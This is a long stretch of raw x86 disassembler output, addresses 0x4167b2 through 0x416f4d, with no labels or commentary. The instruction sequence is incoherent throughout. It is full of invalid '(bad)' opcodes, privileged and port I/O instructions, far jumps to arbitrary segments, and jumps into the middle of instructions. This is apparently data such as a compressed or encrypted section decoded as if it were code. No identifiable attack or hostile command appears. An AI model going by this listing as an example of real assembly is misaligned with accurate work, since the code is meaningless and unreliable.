  4167b2:	push   ebx
  4167b3:	add    DWORD PTR [edx+0x33116717],ebp
  4167b9:	enter  0x49fb,0x5a
  4167bd:	loope  0x416742
  4167bf:	mov    dl,0xbb
  4167c1:	bound  esp,QWORD PTR [ebp-0x61]
  4167c4:	lock loope 0x4167af
  4167c7:	pop    esp
  4167c8:	dec    esi
  4167c9:	mov    bh,0x59
  4167cb:	in     eax,0xdb
  4167cd:	xlat   BYTE PTR ds:[ebx]
  4167ce:	jns    0x41683c
  4167d0:	and    BYTE PTR [esi],al
  4167d2:	xor    al,BYTE PTR [eiz*4-0xad14d67]
  4167d9:	mov    ch,0x4b
  4167db:	jp     0x4167d5
  4167dd:	and    eax,0x685ea4a8
  4167e2:	pop    es
  4167e3:	pop    ecx
  4167e4:	fild   WORD PTR [edx]
  4167e6:	test   DWORD PTR [esi-0x21],eax
  4167e9:	out    dx,eax
  4167ea:	daa    
  4167eb:	in     al,0x23
  4167ed:	hlt    
  4167ee:	fwait
  4167ef:	pop    ecx
  4167f0:	fstp   st(3)
  4167f2:	sti    
  4167f3:	sub    BYTE PTR [esi+ebp*1-0x62],ch
  4167f7:	pop    eax
  4167f8:	mov    ch,cl
  4167fa:	add    BYTE PTR [edx-0x74],ah
  4167fd:	test   eax,0x3d8498be
  416802:	push   edx
  416803:	(bad)  
  416804:	fs aaa 
  416806:	repnz or DWORD PTR [edx],ebx
  416809:	fwait
  41680a:	jge    0x4167a0
  41680c:	aad    0xf7
  41680e:	add    DWORD PTR [edx-0x36],esp
  416811:	aam    0x98
  416813:	ret    0x2068
  416816:	loop   0x4167d6
  416818:	aaa    
  416819:	and    esi,ebx
  41681b:	bound  edi,QWORD PTR [ecx+ecx*8]
  41681e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41681f:	push   0x81103647
  416824:	sti    
  416825:	mov    bh,0x97
  416827:	xor    al,0x7b
  416829:	test   eax,0x8ef45f5f
  41682e:	or     BYTE PTR [edi+0x532abe57],bl
  416834:	mov    ebx,0xc9dc2300
  416839:	pop    ebp
  41683a:	(bad)  
  41683b:	pop    esp
  41683c:	repz pop esp
  41683e:	and    dl,BYTE PTR [edx+edi*4]
  416841:	push   es
  416842:	pushf  
  416843:	mov    bl,0xa3
  416845:	sub    al,0xa7
  416847:	xchg   edx,eax
  416848:	(bad)  
  416849:	sub    esp,esp
  41684b:	fadd   st(3),st
  41684d:	hlt    
  41684e:	aas    
  41684f:	fwait
  416850:	iret   
  416851:	nop
  416852:	jnp    0x41683b
  416854:	fstp   st(4)
  416856:	lods   eax,DWORD PTR ds:[esi]
  416857:	je     0x416822
  416859:	xchg   ebp,eax
  41685b:	rol    esi,1
  41685d:	sbb    ch,BYTE PTR [edx]
  41685f:	sbb    BYTE PTR [ebx-0x795118f6],ah
  416865:	cmp    esp,ebx
  416867:	cmp    al,0x5d
  416869:	add    al,0x78
  41686b:	jne    0x4167fe
  41686d:	xor    BYTE PTR [bp+di-0x1125],ah
  416872:	xor    eax,DWORD PTR [edi-0x20]
  416875:	(bad)  
  416876:	mov    eax,ds:0x7d53cd69
  41687b:	cld    
  41687c:	das    
  41687d:	loope  0x41686d
  41687f:	fwait
  416880:	shl    DWORD PTR [ebx-0x15],1
  416883:	pusha  
  416884:	xor    bh,BYTE PTR [ebx+0x61]
  416887:	outs   dx,DWORD PTR ds:[esi]
  416888:	scas   al,BYTE PTR es:[edi]
  416889:	ret    0xa34d
  41688c:	ins    BYTE PTR es:[edi],dx
  41688d:	jae    0x416856
  41688f:	mov    bh,0xd8
  416891:	arpl   cx,bp
  416893:	(bad)  
  416895:	push   ds
  416896:	les    edx,FWORD PTR [edx-0x62408736]
  41689c:	in     eax,0x38
  41689e:	out    dx,al
  41689f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168a0:	lock ret 0x8f1e
  4168a4:	jae    0x416893
  4168a6:	mov    ebp,0x42cc72cb
  4168ab:	xchg   esp,eax
  4168ac:	add    eax,0x1e7b8d7c
  4168b1:	(bad)  
  4168b2:	sbb    al,0xd3
  4168b4:	inc    ebx
  4168b5:	cmc    
  4168b6:	das    
  4168b7:	retf   0xe24b
  4168ba:	sbb    edx,ebx
  4168bc:	icebp  
  4168bd:	shl    BYTE PTR [ebp+0x65],1
  4168c0:	(bad)  
  4168c1:	mov    edi,0x45d5ec27
  4168c6:	icebp  
  4168c7:	add    esi,DWORD PTR [esi-0x58]
  4168ca:	xlat   BYTE PTR ds:[ebx]
  4168cb:	into   
  4168cc:	jns    0x41686c
  4168ce:	ins    BYTE PTR es:[edi],dx
  4168cf:	pop    ss
  4168d0:	or     DWORD PTR [ebp+0x6413b317],edx
  4168d6:	(bad)  
  4168d7:	add    DWORD PTR [esp+ebp*8+0x1544126],edi
  4168de:	call   0xf1239dc3
  4168e3:	pop    ebp
  4168e4:	push   esi
  4168e5:	mov    ecx,DWORD PTR [edi+0x5a665f44]
  4168eb:	mov    eax,esi
  4168ed:	les    ebp,FWORD PTR [ebp-0x71]
  4168f0:	dec    esp
  4168f1:	in     al,0x3b
  4168f3:	adc    BYTE PTR [edx],al
  4168f5:	je     0x416962
  4168f7:	lds    ecx,FWORD PTR [ecx]
  4168f9:	repnz mov ebx,0xa3f34d92
  4168ff:	sti    
  416900:	sbb    dl,dl
  416902:	std    
  416903:	std    
  416904:	add    eax,0xc99efa30
  416909:	shr    DWORD PTR [esi],1
  41690b:	call   0x6bda:0xc3ab9d68
  416912:	out    dx,eax
  416913:	inc    eax
  416914:	cmp    ah,BYTE PTR [edx]
  416916:	dec    ebp
  416917:	jg     0x416919
  416919:	int3   
  41691a:	mov    dh,0x7f
  41691c:	imul   ebp,edx,0xc0197a7d
  416922:	jl     0x41691a
  416924:	(bad)  
  416925:	cli    
  416926:	sti    
  416927:	cmp    al,BYTE PTR [eax-0x2e814bd8]
  41692d:	nop
  41692e:	mov    esi,0xf91e04a5
  416933:	push   esp
  416934:	xor    esi,DWORD PTR [ebp+0x715a19e]
  41693a:	sti    
  41693b:	jle    0x41699b
  41693d:	loopne 0x416914
  41693f:	or     DWORD PTR [edi+0x44],ecx
  416942:	pop    es
  416943:	ss mov ch,0xf6
  416946:	jecxz  0x416928
  416948:	ret    
  416949:	dec    ebp
  41694a:	xchg   ebx,eax
  41694b:	(bad)  
  41694c:	mov    bl,0x87
  41694e:	outs   dx,DWORD PTR ds:[esi]
  41694f:	imul   esp,esp,0x72
  416952:	stos   DWORD PTR es:[edi],eax
  416953:	not    esp
  416955:	xchg   BYTE PTR [edx],ah
  416957:	stos   BYTE PTR es:[edi],al
  416958:	mov    edx,0x6577b69b
  41695d:	mov    edx,0xa95e27d
  416962:	in     al,dx
  416963:	pop    edx
  416964:	xor    DWORD PTR [ebp-0x79],eax
  416967:	out    0x78,eax
  416969:	in     al,dx
  41696a:	mov    ds:0xcda268b3,al
  41696f:	cmp    al,0xa2
  416971:	outs   dx,DWORD PTR ds:[esi]
  416972:	push   esp
  416973:	dec    edi
  416974:	jmp    0x4169a8
  416976:	sbb    DWORD PTR [eax-0x59],edx
  416979:	sub    eax,0xd9f863dc
  41697e:	fld    DWORD PTR [edi]
  416980:	mov    dh,0xce
  416982:	pop    ecx
  416983:	pop    es
  416984:	xchg   ecx,eax
  416985:	and    BYTE PTR [esi+0x59],al
  416988:	inc    esp
  416989:	adc    eax,DWORD PTR [edx-0x3]
  41698c:	rol    DWORD PTR [esi+0x1bea4251],0x84
  416993:	push   ds
  416994:	pop    es
  416995:	loope  0x416981
  416997:	fild   WORD PTR [eax+0x42]
  41699a:	shufps xmm3,xmm4,0x1e
  41699e:	frstor [ecx+0x2a6a6299]
  4169a4:	test   DWORD PTR [esi+0x3d2be7d1],edx
  4169aa:	jecxz  0x4169b3
  4169ac:	push   eax
  4169ad:	jle    0x4169d8
  4169af:	sbb    BYTE PTR [edi],dl
  4169b1:	dec    ebx
  4169b2:	retf   0x49ac
  4169b5:	mov    DWORD PTR [esi-0x2b61a591],ecx
  4169bb:	rol    cl,cl
  4169bd:	jbe    0x4169ee
  4169bf:	stos   DWORD PTR es:[edi],eax
  4169c0:	xlat   BYTE PTR ds:[ebx]
  4169c1:	xchg   ebp,eax
  4169c2:	cwde   
  4169c3:	popf   
  4169c4:	add    eax,0x70e427e1
  4169c9:	cmp    eax,0xa9023071
  4169ce:	xor    DWORD PTR [ebp-0x7d],esp
  4169d1:	test   BYTE PTR ds:0x8af75ee3,al
  4169d7:	jb     0x4169d0
  4169d9:	fstp   QWORD PTR [ebx+ebp*2]
  4169dc:	mov    bh,0xb2
  4169de:	jns    0x4169a3
  4169e0:	cwde   
  4169e1:	hlt    
  4169e2:	out    dx,al
  4169e3:	idiv   DWORD PTR [eax+0x1e7ba87c]
  4169e9:	fmul   DWORD PTR [ebp-0x3a]
  4169ec:	retf   
  4169ed:	cli    
  4169ee:	sub    BYTE PTR [edx+0x71],0x68
  4169f2:	mov    ch,0xb8
  4169f4:	(bad)  
  4169f6:	cli    
  4169f7:	jnp    0x41698a
  4169f9:	and    eax,0x2c8d2a27
  4169fe:	ja     0x4169ad
  416a00:	out    0x10,al
  416a02:	sub    esp,DWORD PTR [ebp-0x4607d428]
  416a08:	inc    DWORD PTR [ebp-0x45b78b01]
  416a0e:	icebp  
  416a0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a10:	jno    0x416a61
  416a12:	inc    esp
  416a13:	push   0x3b05e099
  416a18:	(bad)  
  416a19:	pop    edi
  416a1a:	xchg   esi,eax
  416a1b:	mov    ebx,DWORD PTR [esi]
  416a1d:	or     dl,cl
  416a1f:	loope  0x416a37
  416a21:	ins    BYTE PTR es:[edi],dx
  416a22:	xchg   esp,eax
  416a23:	jne    0x416a37
  416a25:	dec    esi
  416a26:	inc    ecx
  416a27:	cli    
  416a28:	test   bl,bh
  416a2a:	mov    gs,WORD PTR [esi-0x2f]
  416a2d:	and    al,0x9e
  416a30:	addr16 call 0x339b:0xda2af56
  416a38:	test   al,0x8b
  416a3a:	(bad)  
  416a3b:	mov    ds:0xa1d0af20,al
  416a40:	xor    ch,BYTE PTR [edx-0x6]
  416a43:	adc    al,0x1d
  416a45:	lea    ebp,[edx+0x26]
  416a48:	fld    st(7)
  416a4a:	lods   eax,DWORD PTR ds:[esi]
  416a4b:	and    eax,0x6e2082af
  416a50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a51:	call   0x627f1fe2
  416a56:	jmp    0x9ba378b7
  416a5b:	inc    cl
  416a5d:	cwde   
  416a5e:	sub    dl,BYTE PTR [esi-0x8]
  416a61:	mov    eax,0xe4862187
  416a66:	ins    DWORD PTR es:[edi],dx
  416a67:	xchg   ebx,eax
  416a68:	pusha  
  416a69:	sub    DWORD PTR [ecx],ecx
  416a6b:	enter  0x30ff,0x16
  416a6f:	jno    0x416a34
  416a71:	sub    DWORD PTR [eax],0xfbc9ff04
  416a77:	jmp    0xc3fa:0x3a5ddb5a
  416a7e:	xchg   esi,eax
  416a7f:	dec    esi
  416a80:	shr    DWORD PTR [ebx-0x11],cl
  416a83:	(bad)  
  416a84:	sbb    DWORD PTR [eax+0x5595b9f7],edi
  416a8a:	cmc    
  416a8b:	xchg   edi,eax
  416a8c:	hlt    
  416a8d:	cmp    DWORD PTR ds:0x569ff02b,ecx
  416a93:	jae    0x416a7c
  416a95:	cwde   
  416a96:	hlt    
  416a97:	arpl   WORD PTR [ebx+eiz*4],bx
  416a9a:	sbb    al,0x85
  416a9c:	xchg   esi,eax
  416a9d:	xor    ch,BYTE PTR [ebx*8+0x67111edb]
  416aa4:	not    DWORD PTR [edi-0x71bd442e]
  416aaa:	mov    ds:0xd5b8870c,eax
  416aaf:	sti    
  416ab0:	cs cs mov al,0xc1
  416ab4:	(bad)  
  416ab5:	xchg   DWORD PTR [edi+ebx*8],ebx
  416ab8:	adc    al,0x75
  416aba:	ins    BYTE PTR es:[edi],dx
  416abb:	daa    
  416abc:	inc    eax
  416abd:	clc    
  416abe:	push   esp
  416abf:	dec    ebp
  416ac0:	mov    bl,0x55
  416ac2:	mov    ch,0x76
  416ac4:	pop    edi
  416ac5:	ss stc 
  416ac7:	mov    ?,WORD PTR [edi]
  416ac9:	inc    edx
  416aca:	sub    BYTE PTR [edx],ah
  416acc:	xor    ecx,ebx
  416ace:	je     0x416abc
  416ad0:	inc    esp
  416ad1:	lds    ecx,FWORD PTR es:[edi-0x251bfd7c]
  416ad8:	test   DWORD PTR [ebp-0x14],0x712f517e
  416adf:	ss call 0x6e55:0xc32da1b2
  416ae7:	add    dh,0x7
  416aea:	(bad)  
  416aeb:	push   ecx
  416aec:	repnz xor DWORD PTR [eax],eax
  416aef:	jno    0x416af7
  416af1:	push   ds
  416af2:	mov    bl,0xc
  416af4:	cs daa 
  416af6:	xor    DWORD PTR [ebp-0x28f71f04],ebp
  416afc:	dec    ecx
  416afd:	mov    ds:0x691a5660,eax
  416b02:	test   al,0xe3
  416b04:	sub    bl,ch
  416b06:	pop    esp
  416b07:	repnz or ebp,DWORD PTR [ecx+0xe6bb35f]
  416b0e:	add    eax,0x6eea5f24
  416b13:	or     edx,DWORD PTR [edi-0x2ae73842]
  416b19:	jbe    0x416af8
  416b1b:	mov    ecx,0xb8fd3d25
  416b20:	sbb    ch,BYTE PTR [esp-0x39]
  416b24:	jecxz  0x416ae7
  416b26:	adc    al,0x88
  416b28:	popf   
  416b29:	shl    BYTE PTR [ebx-0x58],1
  416b2c:	cmc    
  416b2d:	lds    ebp,FWORD PTR [ebx+0x2b]
  416b30:	loope  0x416aff
  416b32:	mov    ds:0xfc83e25c,al
  416b37:	dec    ebp
  416b38:	lds    esp,FWORD PTR [ebp+eiz*2+0x7595c13d]
  416b3f:	add    edi,esi
  416b41:	xchg   DWORD PTR [ebp-0x2c],ebx
  416b44:	xor    ebx,DWORD PTR [edi-0x75]
  416b47:	outs   dx,DWORD PTR ds:[esi]
  416b48:	jmp    0xd038:0x27868309
  416b4f:	adc    eax,0xda9f2fd5
  416b54:	clc    
  416b55:	xor    eax,0x4db51170
  416b5a:	or     BYTE PTR [ebx+0x44f5cfb7],bh
  416b60:	cli    
  416b61:	cmp    ecx,DWORD PTR [esi]
  416b63:	inc    edx
  416b64:	arpl   WORD PTR [edi],ax
  416b66:	ds push 0x1f
  416b69:	not    BYTE PTR [eax+0x769b4917]
  416b6f:	inc    esp
  416b70:	scas   eax,DWORD PTR es:[edi]
  416b71:	mov    cl,0x9e
  416b73:	and    cl,bl
  416b75:	imul   edx,DWORD PTR [ecx-0x66df64b],0x129fc738
  416b7f:	sub    edx,edi
  416b81:	jecxz  0x416b0e
  416b83:	sbb    BYTE PTR [edi+ecx*8-0x6b],ah
  416b87:	stos   BYTE PTR es:[edi],al
  416b88:	add    al,0x36
  416b8a:	fucomp st(3)
  416b8c:	xchg   esi,eax
  416b8d:	jl     0x416bdd
  416b8f:	fnstcw WORD PTR [edx+ecx*4+0xe4edc80]
  416b96:	cmp    DWORD PTR [ecx],edi
  416b98:	adc    ebx,edx
  416b9a:	and    al,0xd0
  416b9c:	jmp    0x416c1b
  416b9e:	neg    ebp
  416ba0:	jge    0x416bb3
  416ba2:	push   edx
  416ba3:	xchg   BYTE PTR [ecx],dh
  416ba5:	aaa    
  416ba6:	lds    esi,FWORD PTR [ebp+edi*8-0x63]
  416baa:	inc    edi
  416bab:	je     0x416b33
  416bad:	in     al,dx
  416bae:	test   al,0x7d
  416bb0:	xchg   ebp,eax
  416bb1:	std    
  416bb2:	in     al,0xfc
  416bb4:	ret    0xf7d7
  416bb7:	push   ds
  416bb8:	retf   0x38c
  416bbb:	push   es
  416bbc:	ss dec esi
  416bbe:	sbb    ebx,edi
  416bc0:	jns    0x416b73
  416bc2:	imul   ebp,DWORD PTR [ebx-0x1de1b420],0xffffffd1
  416bc9:	mov    BYTE PTR [esi+ebp*8],bh
  416bcc:	mov    ds:0x5d39f01a,eax
  416bd1:	enter  0x8b4e,0xa2
  416bd5:	jae    0x416bdd
  416bd7:	outs   dx,DWORD PTR ds:[esi]
  416bd8:	(bad)  
  416bda:	scas   eax,DWORD PTR es:[edi]
  416bdb:	push   ss
  416bdc:	pop    ebx
  416bdd:	(bad)
  416be0:	imul   DWORD PTR [ebx-0x5274d412]
  416be6:	ror    BYTE PTR [edi+ebx*8-0x35a24d27],0xfe
  416bee:	sbb    eax,0xbbbaa785
  416bf3:	lods   eax,DWORD PTR ds:[esi]
  416bf4:	add    ch,BYTE PTR [ecx+0x1d58c57d]
  416bfa:	arpl   WORD PTR [esp+eax*4-0x60],si
  416bfe:	jmp    0x40dd:0x1befb309
  416c05:	iret   
  416c06:	or     eax,eax
  416c08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c09:	jnp    0x416c22
  416c0b:	mov    bh,0xa0
  416c0d:	adc    eax,0xe58a2232
  416c12:	test   BYTE PTR [esi],ah
  416c14:	push   edi
  416c15:	fisub  WORD PTR [edx+0x9]
  416c18:	loop   0x416c09
  416c1a:	js     0x416c19
  416c1c:	jge    0x416bc2
  416c1e:	enter  0x2724,0x9e
  416c22:	scas   eax,DWORD PTR es:[edi]
  416c23:	sub    eax,0x2d2fa9a2
  416c28:	pop    edx
  416c29:	jp     0xe6f93ddd
  416c2f:	data16 xor al,0x30
  416c32:	xchg   esi,eax
  416c33:	les    eax,FWORD PTR [edx-0x36cc5c29]
  416c39:	imul   ebp,DWORD PTR ss:[eax-0x49730cd8],0x39
  416c41:	xlat   BYTE PTR ds:[ebx]
  416c42:	lods   al,BYTE PTR ds:[esi]
  416c43:	xlat   BYTE PTR ds:[ebx]
  416c44:	dec    edi
  416c45:	and    BYTE PTR [esi],0x42
  416c48:	imul   ebp,DWORD PTR [ebp-0x2670b6b0],0xffffffdf
  416c4f:	test   DWORD PTR [ebp-0x16],ebx
  416c52:	pop    esi
  416c53:	into   
  416c54:	dec    ebx
  416c55:	in     al,dx
  416c56:	iret   
  416c57:	ins    BYTE PTR es:[edi],dx
  416c58:	or     eax,0xd39ff0af
  416c5d:	and    al,0x2b
  416c5f:	and    ecx,DWORD PTR cs:[eax]
  416c62:	xor    cl,bl
  416c64:	inc    esi
  416c65:	fs add eax,0x17ee7e27
  416c6b:	push   edi
  416c6c:	inc    DWORD PTR [esi+0x2eec28f3]
  416c72:	sti    
  416c73:	aas    
  416c74:	daa    
  416c75:	ja     0x416cc4
  416c77:	rcr    edx,0xfb
  416c7a:	dec    ebx
  416c7b:	lods   eax,DWORD PTR ds:[esi]
  416c7c:	test   BYTE PTR [esp+edx*8+0x60],al
  416c80:	cmp    DWORD PTR [edx],0xffffff8e
  416c83:	fmul   DWORD PTR [eax+ecx*4-0x6e0bdc]
  416c8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c8b:	xchg   edx,edx
  416c8d:	aaa    
  416c8e:	fimul  WORD PTR [ebp+0x49]
  416c91:	scas   al,BYTE PTR es:[edi]
  416c92:	sar    BYTE PTR [esp+edi*1+0x1cb40051],cl
  416c99:	cdq    
  416c9a:	sbb    al,0x77
  416c9c:	arpl   WORD PTR [ebx-0x7649c476],cx
  416ca2:	mov    ecx,DWORD PTR [ebp-0x58]
  416ca5:	jo     0x416c9c
  416ca7:	push   es
  416ca8:	aam    0x31
  416caa:	mov    eax,ds:0x159c4455
  416caf:	jbe    0x416c73
  416cb1:	ret    0x8fb5
  416cb4:	mov    edi,0xf4dc8bf0
  416cb9:	or     ch,0x17
  416cbc:	retf   
  416cbd:	jecxz  0x416ced
  416cbf:	jge    0x416c6c
  416cc1:	adc    cl,ah
  416cc3:	fidiv  DWORD PTR [eax]
  416cc5:	cli    
  416cc6:	sbb    al,0xc8
  416cc8:	stos   DWORD PTR es:[edi],eax
  416cc9:	imul   edi,DWORD PTR [ebx-0x4e34b4db],0x34060e10
  416cd3:	jae    0x416c92
  416cd5:	push   eax
  416cd6:	(bad)  
  416cd7:	in     eax,dx
  416cd8:	sub    BYTE PTR [ebp+0x420df9ca],bh
  416cde:	jecxz  0x416cb9
  416ce0:	pusha  
  416ce1:	cmp    edx,DWORD PTR [esi]
  416ce3:	lds    esp,FWORD PTR [edx]
  416ce5:	lock stos BYTE PTR es:[edi],al
  416ce7:	addr16 int3 
  416ce9:	xchg   ebx,eax
  416cea:	aam    0xd4
  416cec:	sahf   
  416ced:	mov    ds:0xd324eb75,al
  416cf2:	cmp    bh,BYTE PTR [edx-0x40]
  416cf5:	repz adc eax,0xb098b6ae
  416cfb:	xlat   BYTE PTR ds:[ebx]
  416cfc:	mov    bl,0xbf
  416cfe:	jbe    0x416cb3
  416d00:	cwde   
  416d01:	mov    esi,0xe9027e93
  416d06:	stos   DWORD PTR es:[edi],eax
  416d07:	aas    
  416d08:	push   0x9dddcc0b
  416d0d:	push   0x299c793e
  416d12:	clc    
  416d13:	jge    0x416d7c
  416d15:	push   esp
  416d16:	test   BYTE PTR [ecx+0x14],dh
  416d19:	sub    esp,DWORD PTR [esi+ecx*1-0x7cb38e1b]
  416d20:	cli    
  416d21:	ins    BYTE PTR es:[edi],dx
  416d22:	je     0x416cfa
  416d24:	pop    ebx
  416d25:	(bad)  
  416d26:	lods   al,BYTE PTR ds:[esi]
  416d27:	push   ebx
  416d28:	mov    ds:0xf9f4b61e,al
  416d2d:	rcr    BYTE PTR [edx],1
  416d2f:	out    0x70,al
  416d31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d32:	shr    bh,0x30
  416d35:	xchg   esp,eax
  416d36:	fdiv   DWORD PTR [edx]
  416d38:	cmp    BYTE PTR [eax],al
  416d3a:	pop    ebx
  416d3b:	xor    ebp,esp
  416d3d:	leave  
  416d3e:	rcl    bl,1
  416d40:	lock fisub DWORD PTR [esi+0x49ce7854]
  416d47:	adc    bh,0x43
  416d4a:	pop    eax
  416d4b:	fnstenv [eax-0x6d963df8]
  416d51:	adc    al,cl
  416d53:	mov    BYTE PTR [esi+0x1fc5a65a],ah
  416d59:	push   ds
  416d5a:	mov    ebp,0x2f15c947
  416d5f:	xchg   esp,eax
  416d60:	in     al,0xf8
  416d62:	push   0x10d3689c
  416d67:	mov    ds:0x6d00c058,eax
  416d6c:	push   es
  416d6d:	hlt    
  416d6e:	pop    ebp
  416d6f:	or     BYTE PTR [ebp+0x38610f95],bh
  416d75:	mov    ch,0xaa
  416d77:	out    0xeb,eax
  416d79:	pop    eax
  416d7a:	cmc    
  416d7b:	mov    edi,0x6de55b04
  416d80:	add    eax,0xe9ccc7a9
  416d85:	clc    
  416d86:	jp     0x416da1
  416d88:	loopne 0x416d81
  416d8a:	xor    bl,BYTE PTR [eax+eax*2+0x7e]
  416d8e:	xchg   ebx,eax
  416d8f:	outs   dx,BYTE PTR ds:[esi]
  416d90:	repnz aam 0xa3
  416d93:	fidivr WORD PTR [esi-0x3b]
  416d96:	xor    DWORD PTR [ecx+0x7ee97ce5],eax
  416d9c:	xchg   ebp,eax
  416d9d:	fsub   st,st(0)
  416d9f:	hlt    
  416da0:	leave  
  416da1:	sbb    al,0x8c
  416da3:	and    eax,DWORD PTR [eax-0x6f8b2cd9]
  416da9:	(bad)  
  416daa:	jno    0x416db9
  416dac:	dec    edx
  416dad:	xchg   ebx,eax
  416dae:	mov    ds:0xca6bc995,eax
  416db3:	jmp    FWORD PTR [ecx+0x1f]
  416db6:	mov    bx,0xaeab
  416dba:	out    dx,al
  416dbb:	mov    ?,WORD PTR [ebx-0x60]
  416dbe:	mov    ds:0x4fcfeb58,eax
  416dc3:	cs dec edx
  416dc5:	rcl    DWORD PTR [edx],cl
  416dc7:	or     DWORD PTR [esi-0x13],ecx
  416dca:	sbb    ebp,DWORD PTR [edx+0x4be3c96b]
  416dd0:	jns    0x416e42
  416dd2:	inc    esp
  416dd3:	(bad)  
  416dd4:	in     eax,0x74
  416dd6:	push   edi
  416dd7:	ror    BYTE PTR [eax+ebp*2+0x7dd8d44b],cl
  416dde:	xor    eax,0x34aa9993
  416de3:	rcl    DWORD PTR [esi-0x50],1
  416de6:	xchg   edx,eax
  416de7:	test   DWORD PTR ds:[edx+0x21],ebx
  416deb:	daa    
  416dec:	lock pop es
  416dee:	pop    ebp
  416def:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416df0:	dec    ecx
  416df1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416df2:	dec    ecx
  416df3:	push   eax
  416df4:	lods   al,BYTE PTR ds:[esi]
  416df5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416df6:	popa   
  416df7:	adc    al,0x92
  416df9:	xor    bl,BYTE PTR [ecx+0x3ad27ea5]
  416dff:	(bad)  
  416e00:	dec    esi
  416e01:	call   0x532a2014
  416e06:	mov    al,ds:0x868fcff1
  416e0b:	pop    ebx
  416e0c:	cwde   
  416e0d:	pop    es
  416e0e:	adc    eax,0x4f186396
  416e13:	jmp    0x416e29
  416e15:	pop    edx
  416e16:	or     bh,BYTE PTR [ebp-0x74715c86]
  416e1c:	jno    0x416e73
  416e1e:	mov    esi,esp
  416e20:	xchg   edi,eax
  416e21:	test   al,0x9a
  416e23:	sbb    ecx,DWORD PTR [ecx]
  416e25:	sub    ch,ch
  416e27:	mov    dh,0x1f
  416e29:	std    
  416e2a:	jle    0x416e14
  416e2c:	push   esp
  416e2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e2e:	clc    
  416e2f:	repnz add cl,bh
  416e32:	inc    edi
  416e33:	pop    es
  416e34:	mov    dl,0x22
  416e36:	sub    BYTE PTR [ebx-0x77078f50],al
  416e3c:	ret    0xd7d9
  416e3f:	dec    edx
  416e40:	mov    ds:0xb3d23a0d,eax
  416e45:	jbe    0x416e11
  416e47:	lock jne 0x416df9
  416e4a:	mov    BYTE PTR [edi],ah
  416e4c:	inc    edx
  416e4d:	loope  0x416e88
  416e4f:	repnz adc al,0x6
  416e52:	(bad)  
  416e53:	(bad)  
  416e54:	sti    
  416e55:	add    ecx,ebx
  416e57:	cmp    al,0x29
  416e59:	test   eax,0xa23394f7
  416e5e:	out    dx,al
  416e5f:	jne    0x416e05
  416e61:	cmc    
  416e62:	or     eax,DWORD PTR [ecx+0x42]
  416e65:	or     dl,BYTE PTR [ebx]
  416e67:	xor    esi,eax
  416e69:	test   eax,0x49dbffa5
  416e6e:	jbe    0x416e28
  416e70:	inc    ebx
  416e71:	mov    ebp,0xa656ddbc
  416e76:	(bad)  
  416e77:	leave  
  416e78:	ficom  DWORD PTR [ebx-0x25]
  416e7b:	inc    edi
  416e7c:	repz sbb ch,BYTE PTR [eax]
  416e7f:	mov    ch,0x5
  416e81:	xchg   ecx,eax
  416e82:	mov    eax,0xb0504510
  416e87:	and    eax,0x3baa32af
  416e8c:	xchg   edx,eax
  416e8d:	or     al,0xf5
  416e8f:	in     al,0xe4
  416e91:	hlt    
  416e92:	and    BYTE PTR [ecx],al
  416e94:	xor    bl,BYTE PTR [esi+0x62]
  416e97:	imul   ebp,DWORD PTR [ebx+0x69],0x16
  416e9b:	outs   dx,DWORD PTR ds:[esi]
  416e9c:	sub    ah,dl
  416e9e:	fs nop
  416ea0:	jae    0x416e89
  416ea2:	loopne 0x416ed1
  416ea4:	and    DWORD PTR [ebx-0x45],ebp
  416ea7:	jmp    0x61c1:0xa636fd3c
  416eae:	xor    eax,DWORD PTR ds:0xcdbe0e6d
  416eb4:	lods   eax,DWORD PTR ds:[esi]
  416eb5:	mov    edi,0xe839a631
  416eba:	push   ecx
  416ebb:	loop   0x416e3e
  416ebd:	in     eax,0x75
  416ebf:	mov    cl,0x7a
  416ec1:	xchg   ebx,eax
  416ec2:	mov    ds:0xc10f8700,eax
  416ec7:	mov    ah,0x5
  416ec9:	fidivr DWORD PTR [edx+ebp*1-0x14]
  416ecd:	dec    edi
  416ece:	rol    DWORD PTR [esi+0x4a580721],1
  416ed4:	or     DWORD PTR [ebp+0x4a],0xddf6a68
  416edb:	push   cs
  416edc:	arpl   WORD PTR [ebx+eiz*4+0x5d14f327],sp
  416ee3:	dec    edx
  416ee4:	gs xchg esp,eax
  416ee6:	pusha  
  416ee7:	pop    edi
  416ee8:	sub    DWORD PTR ds:[eax],eax
  416eeb:	jecxz  0x416f1d
  416eed:	dec    esp
  416eee:	jmp    0x6ed7:0x43c738ec
  416ef5:	cs test al,0x93
  416ef8:	pop    edi
  416ef9:	into   
  416efa:	cmc    
  416efb:	mov    edi,0x5663ac42
  416f00:	int    0xdb
  416f02:	ins    DWORD PTR es:[edi],dx
  416f03:	mov    WORD PTR [edx+0xd],ds
  416f06:	pusha  
  416f07:	std    
  416f08:	pop    es
  416f09:	jne    0x416f13
  416f0b:	mov    esp,DWORD PTR [edx+0x2]
  416f0e:	loop   0x416f5d
  416f10:	sbb    al,0xd5
  416f12:	mov    esi,0xa5125f44
  416f17:	jmp    0x9ce35460
  416f1c:	es jecxz 0x416f34
  416f1f:	push   esp
  416f20:	test   BYTE PTR [edx],cl
  416f22:	data16 fcom QWORD PTR [ebx+0xb]
  416f26:	in     al,0xcf
  416f28:	mov    cl,0x6b
  416f2a:	cs mov ch,0xe0
  416f2d:	out    dx,eax
  416f2e:	dec    ebp
  416f2f:	mov    ah,0x9f
  416f31:	test   al,0xa6
  416f33:	das    
  416f34:	push   ebp
  416f35:	mov    ss,WORD PTR [edx]
  416f37:	dec    esp
  416f38:	mov    al,0x62
  416f3a:	push   edx
  416f3b:	daa    
  416f3c:	ret    
  416f3d:	pusha  
  416f3e:	aas    
  416f3f:	mov    bl,0xfc
  416f41:	add    al,0x86
  416f43:	and    BYTE PTR [esi],dh
  416f45:	sub    eax,0xdb69f59a
  416f4a:	adc    BYTE PTR [ecx-0x58],al
  416f4d:	arpl   WORD PTR [edx],cx
